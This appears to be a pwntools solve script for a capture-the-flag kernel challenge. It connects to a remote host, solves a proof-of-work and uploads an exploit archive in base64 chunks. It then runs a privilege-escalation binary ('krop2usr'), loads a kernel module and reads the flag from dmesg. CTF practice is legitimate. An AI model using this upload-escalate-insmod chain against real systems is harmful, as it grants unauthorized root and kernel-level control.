from pwn import *
import base64
import subprocess


with open("./payload.tar.gz", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

# p = process("")
p = remote("34.124.157.94", 32110)

p.recvuntil(b"| sh -s")
x = process(["sh", "./pow.sh", p.recvlineS().strip()])
p.sendline(x.recvline().strip())
log.info("pow solved")

p.sendlineafter(b"$", b"cd /tmp")
with log.progress("transferring exploit") as pro:
    for i in range(0, len(payload), 512):
        pro.status(f"{i:x} / {len(payload):x}")
        p.sendlineafter(b"$", f'echo {payload[i:i+512]} >> b64exp'.encode())
p.sendlineafter(b"$", b'base64 -d b64exp > exploit.tar.gz')

p.sendlineafter(b"$", b'tar xvf exploit.tar.gz')
p.sendlineafter(b"$", b'chmod +x krop2usr')
p.sendlineafter(b"$", b'./krop2usr')
p.sendlineafter(b"#", b'insmod find_flag.ko')
p.sendlineafter(b"#", b'dmesg')
p.recvuntil(b"found flag at")
p.recvline()
flag = p.recvuntil(b"\r\n", drop=True)

log.success(flag)
